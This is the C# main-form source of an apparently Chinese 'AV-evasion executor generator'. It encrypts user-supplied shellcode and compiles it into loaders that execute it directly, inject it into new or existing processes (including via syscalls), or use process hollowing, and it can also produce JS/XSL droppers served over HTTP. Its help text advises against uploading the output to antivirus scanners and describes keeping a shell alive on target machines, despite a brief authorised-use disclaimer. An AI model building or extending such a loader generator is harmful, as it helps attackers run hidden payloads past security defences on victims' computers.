using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Xml.Schema;


namespace 掩日___免杀执行器生成工具
{
    public partial class Form1 : Form
    {
        //定义密钥和偏移，其中密钥将在每次点击按钮时随机生成
        public static byte[] KEY;
        public static byte[] IV = { 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc };
        //要把key转成字符串形式写入到模板文件中
        public static string KEY_String;

        public static string ico_filename = null;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBox4.SelectedIndex = 0;
        }

        //生成随机KEY
        private byte[] Random_Key()
        {
            string t = "";
            for (int i = 0; i < 23; i++)
            {
                RNGCryptoServiceProvider csp = new RNGCryptoServiceProvider();
                byte[] byteCsp = new byte[23];
                csp.GetBytes(byteCsp);
                t = BitConverter.ToString(byteCsp);
            }
            string[] t_array = t.Split('-');
            List<byte> key_list = new List<byte>();

            foreach (string i in t_array)
            {
                key_list.Add(string_to_int(i));
            }

            return key_list.ToArray();
        }


        //利用 DotNetToJscript 生成JS或XSL,返回字符串格式
        private string Generate_JS_XSL(string type)
        {
            //1. 生成一个 dll 文件
            string target_arch = " /platform:x86 /optimize ";
            if (radioButton2.Checked)
            {
                target_arch = " /platform:x64 /optimize";
            }

            KEY = Random_Key();
            List<string> temp_list = new List<string>();
            foreach (byte i in KEY)
            {
                temp_list.Add("0x" + i.ToString("X2"));
            }
            KEY_String = string.Join(",", temp_list);

            
            Compiler compiler = new Compiler();
            TP_VirtualAlloc_DLL vad = new TP_VirtualAlloc_DLL(KEY_String, Handle_Payload());
            compiler.compileToExe(vad.GetCode(), KEY_String, Global_Var.dll_path, target_arch, "library");
            

            //2. 通过 DotNetToJscript 转换成 js
            string js_result = DotNetToJScript.Generate();

            if (js_result != null)
            {
                if (type == ".js")
                {
                    return js_result;
                }
                else 
                {
                    TP_XSL xsl = new TP_XSL();
                    return xsl.GetCode(js_result);
                }
            }
            else
            {
                return null;
            }
        }

        //处理并加密shellcode
        private string Handle_Payload()
        {
            //对用户输入的payload进行一些转换处理，方便下一步的加密
            string raw_input = textBox1.Text.Trim().Replace("\r\n", "").Replace("\n", "").Replace("\r", ""); //支持多种linux win换行符
            string payload_pattern_csharp = @"\{(.+?)\}";
            string payload_pattern_c = @"=.*"";$";
            string[] raw_payload_array;
            if (Regex.IsMatch(raw_input, payload_pattern_c))
            {
                //c语言格式的shellcode，转成 csharp 格式
                raw_input = raw_input.Replace("\"", "").Replace("\\", ",0").Replace(";", "").Replace("=", "{").Replace("{,", "{ ") + " }";
            }
            string raw_payload = Regex.Matches(raw_input, payload_pattern_csharp)[0].Value.Replace("{", "").Replace("}", "").Trim();
            raw_payload = raw_payload.TrimStart(',');
            raw_payload_array = raw_payload.Split(',');
            List<byte> byte_payload_list = new List<byte>();

            foreach (string i in raw_payload_array)
            {
                byte_payload_list.Add(string_to_int(i));
            }
            byte[] payload_result = byte_payload_list.ToArray();

            //加密payload并转换为字符串，准备写入文件
            byte[] encrypted_payload = Encrypter.Encrypt(KEY, payload_result);
            string string_encrypted_payload = string.Join(",", encrypted_payload);
            //MessageBox.Show(string_encrypted_payload);
            return string_encrypted_payload;
        }

        //字符串转十进制，返回byte形式
        private byte string_to_int(string str)
        {
            string temp = str.Substring(str.Length - 2, 2);
            int hex = int.Parse(temp, System.Globalization.NumberStyles.HexNumber);
            return BitConverter.GetBytes(hex)[0];
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if ((textBox2.Enabled) && (textBox2.Text.Trim() == ""))
            {
                MessageBox.Show("注入进程时应按照要求填写进程名或 pid", "警告");
                return;
            }
            string file_type = comboBox1.Text;
            string target_arch = null;
            Compiler compiler = new Compiler();
            target_arch = " /platform:x86 /optimize ";

            switch (file_type)
            {
                case ".exe":
                    saveFileDialog1.Filter = "可执行文件|*.exe";
                    break;
                case ".js":
                    saveFileDialog1.Filter = "js脚本|*.js";
                    break;
                case ".xsl":
                    saveFileDialog1.Filter = "xsl文件|*.xsl";
                    break;
            }
            DialogResult dr = saveFileDialog1.ShowDialog();

            if (dr == DialogResult.OK && saveFileDialog1.FileName.Length > 0)
            {
                switch (file_type)
                {
                    case ".exe":
                        if (radioButton2.Checked)
                        {
                            target_arch = " /platform:x64 /optimize";
                        }

                        if (checkBox2.Checked)
                        {
                            target_arch += "/target:winexe ";
                        }

                        if (ico_filename != null)
                        {
                            target_arch += " /win32icon:" + ico_filename;
                        }

                        KEY = Random_Key();
                        List<string> temp_list = new List<string>();
                        foreach (byte i in KEY)
                        {
                            temp_list.Add("0x" + i.ToString("X2"));
                        }
                        KEY_String = string.Join(",", temp_list); //生成key的字符串形式，用于写入到文件


                        switch (comboBox4.Text)
                        {
                            case "直接执行(VirtualAlloc)":
                                TP_VirtualAlloc va = new TP_VirtualAlloc(KEY_String, Handle_Payload());
                                compiler.compileToExe(va.GetCode(), KEY_String, saveFileDialog1.FileName, target_arch);
                                break;
                            case "直接执行(VirtualProtect)":
                                TP_VirtualProtect vp = new TP_VirtualProtect(KEY_String, Handle_Payload());
                                compiler.compileToExe(vp.GetCode(), KEY_String, saveFileDialog1.FileName, target_arch);
                                break;
                            case "[x64]新进程注入(SYSCALL)":
                                TP_Syscall_New scn = new TP_Syscall_New(KEY_String, Handle_Payload(), textBox2.Text.Trim());
                                target_arch += " /unsafe"; //必需，因为包含了不安全代码
                                compiler.compileToExe(scn.GetCode(), KEY_String, saveFileDialog1.FileName, target_arch);
                                break;
                            case "新进程注入(VirtualAllocEx)":
                                TP_VirtualAllocEx vaex = new TP_VirtualAllocEx(KEY_String, Handle_Payload(), textBox2.Text);
                                compiler.compileToExe(vaex.GetCode(), KEY_String, saveFileDialog1.FileName, target_arch);
                                break;
                            case "注入现有进程(VirtualAllocEx)":
                                TP_VirtualAllocEx_Exist vaee = new TP_VirtualAllocEx_Exist(KEY_String, Handle_Payload(), Convert.ToInt32(textBox2.Text.Trim()));
                                compiler.compileToExe(vaee.GetCode(), KEY_String, saveFileDialog1.FileName, target_arch);
                                break;
                            case "[x64]注入现有进程(SYSCALL)":
                                TP_Syscall_Exist sce = new TP_Syscall_Exist(KEY_String, Handle_Payload(), Convert.ToInt32(textBox2.Text.Trim()));
                                target_arch += " /unsafe"; //必需，因为包含了不安全代码
                                compiler.compileToExe(sce.GetCode(), KEY_String, saveFileDialog1.FileName, target_arch);
                                break;
                            case "进程镂空(Process Hollowing)":
                                TP_Process_Hollowing ph = new TP_Process_Hollowing(KEY_String, Handle_Payload(), textBox2.Text);
                                target_arch += " /unsafe"; //必需，因为包含了不安全代码
                                compiler.compileToExe(ph.GetCode(), KEY_String, saveFileDialog1.FileName, target_arch);
                                break;
                        }
                        break;
                    default:
                        string temp = Generate_JS_XSL(file_type);
                        System.IO.File.WriteAllText(saveFileDialog1.FileName, temp);
                        break;
                }
                MessageBox.Show("All seems fine. Lets Hack the Plant!\r\n\r\nWARNING: 不要将生成的程序上传到在线杀毒网站！", "ALL SUCCESS!");
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Form2 how_to_generate_shellcode = new Form2();
            how_to_generate_shellcode.Show();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("务必不要将生成的程序上传到在线杀毒网站。\r\n本程序仅供授权测试人员使用，严禁用于未授权用途。\r\n\r\n程序参考了开源项目 Avator 的结构，并使用了开源项目 GadgetToJScript 的大量代码，在此表示感谢。\r\n" +
                "\r\n1y0n.com", "关于");
        }

        private void comboBox4_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboBox4.Text)
            {
                case "直接执行(VirtualAlloc)":
                case "直接执行(VirtualProtect)":
                    textBox2.Text = "";
                    radioButton1.Enabled = true;
                    textBox2.Enabled = false;
                    textBox2.BackColor = Color.White;
                    break;
                case "[x64]新进程注入(SYSCALL)":
                    radioButton2.Checked = true;
                    radioButton1.Enabled = false;
                    label6.Text = "注入进程：";
                    textBox2.Text = "notepad.exe";
                    textBox2.Enabled = true;
                    break;
                case "新进程注入(VirtualAllocEx)":
                case "进程镂空(Process Hollowing)":
                    radioButton1.Enabled = true;
                    label6.Text = "注入进程：";
                    textBox2.Text = "notepad.exe";
                    textBox2.Enabled = true;
                    break;
                case "[x64]注入现有进程(SYSCALL)":
                    radioButton2.Checked = true;
                    radioButton1.Enabled = false;
                    label6.Text = "注入 pid：";
                    textBox2.Text = "";
                    textBox2.Enabled = true;
                    break;
                case "注入现有进程(VirtualAllocEx)":
                    radioButton1.Enabled = true;
                    label6.Text = "注入 pid：";
                    textBox2.Text = "";
                    textBox2.Enabled = true;
                    break;
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Set_Icon();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Set_Icon();
        }

        public void Set_Icon()
        {
            openFileDialog1.Filter = "ICO图标文件|*.ico";
            DialogResult ico_file = openFileDialog1.ShowDialog();
            if (ico_file == DialogResult.OK && openFileDialog1.FileName.Length > 0)
            {
                pictureBox1.Image = Image.FromFile(openFileDialog1.FileName);
                ico_filename = openFileDialog1.FileName;
                label2.Visible = false;
            }
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            Global_Var.arch = "x86";
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("1. 直接执行：直接申请内存并解密shellcode执行，程序关闭后shell也消失。\r\n\r\n" +
                "2. 新进程注入：生成一个后台隐藏正常进程，并将shellcode解密注入到此进程中执行，shell一直存在。但是可能会被杀注入行为。\r\n\r\n" +
                "3. 注入现有进程：注入目标机器上已经存在的一个进程，需要提供进程 id ，shell一直存在。可能会被杀行为。\r\n\r\n" +
                "---------\r\n\r\n总的来说，推荐“直接执行(VirtualProtect)”并选择“隐藏执行界面”。如果想要注入，优先选 SYSCALL（只支持64位系统）。", "说明");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Global_Var.XSL_code = Generate_JS_XSL(".xsl");
            //System.IO.File.WriteAllText("hope.xsl", Global_Var.XSL_code);

            //显示http服务启动及命令复制窗口
            OneCmdShell ocs_form = new OneCmdShell();
            ocs_form.Show();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked) 
            {
                Global_Var.delay = Convert.ToInt32(numericUpDown1.Value);
                numericUpDown1.Enabled = true;
            }
            else
            {
                Global_Var.delay = 0;
                numericUpDown1.Enabled = false;
            }
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                Global_Var.delay = Convert.ToInt32(numericUpDown1.Value);
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                Global_Var.hidden = true;
            }
            else
            {
                Global_Var.hidden = false;
            }
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                Global_Var.var_random = true;
            }
            else
            {
                Global_Var.var_random = false;
            }
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            Global_Var.arch = "x64";
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            if ((textBox2.Enabled) && (textBox2.Text.Trim() == ""))
            {
                textBox2.BackColor = Color.Red;
            }
            else
            {
                textBox2.BackColor = Color.White;
            }
        }
    }
}
